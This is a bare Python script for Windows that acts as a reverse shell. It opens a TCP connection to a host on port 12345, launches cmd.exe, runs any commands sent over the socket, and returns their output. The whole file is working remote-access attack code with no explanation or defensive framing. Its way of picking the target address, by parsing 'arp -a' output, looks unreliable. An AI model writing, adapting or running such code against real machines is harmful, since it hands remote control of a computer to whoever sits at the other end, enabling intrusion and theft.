import socket
import subprocess
import threading
import time

def get_ip():
    try:
        arp_output = subprocess.getoutput('arp -a')
        for line in arp_output.split('\n'):
            if 'Interface' in line:
                return line.split()[1]
        return '127.0.0.1'
    except:
        return '127.0.0.1'


server_ip = get_ip()
server_port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, server_port))


shell = subprocess.Popen(
    ["cmd.exe"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    universal_newlines=True
)


running = True
output_buffer = ""
output_lock = threading.Lock()

def read_output():
    global running, output_buffer
    while running:
        output = shell.stdout.readline()
        if output:
            with output_lock:
                output_buffer += output
        else:
            time.sleep(0.1)


def handle_commands():
    global running, output_buffer
    while running:
        try:
            
            cmd = sock.recv(1024).decode().strip()
            if not cmd:
                continue
            
            if cmd.lower() in ('exit', 'quit'):
                running = False
                break
            
            shell.stdin.write(cmd + "\n")
            shell.stdin.flush()
            
            time.sleep(0.3)
            
            
            with output_lock:
                if output_buffer:
                    sock.sendall(output_buffer.encode())
                    output_buffer = ""
                else:
                    sock.sendall(b"no output received\n")
                    
        except (ConnectionResetError, BrokenPipeError):
            running = False
            break
        except Exception as e:
            sock.sendall(f"error: {str(e)}".encode())
            continue

output_thread = threading.Thread(target=read_output, daemon=True)
command_thread = threading.Thread(target=handle_commands, daemon=True)
output_thread.start()
command_thread.start()

try:
    while running:
        time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    running = False
    try:
        shell.stdin.write("exit\n")
        shell.stdin.flush()
    except:
        pass
    
    shell.terminate()
    sock.close()
    output_thread.join()
    command_thread.join()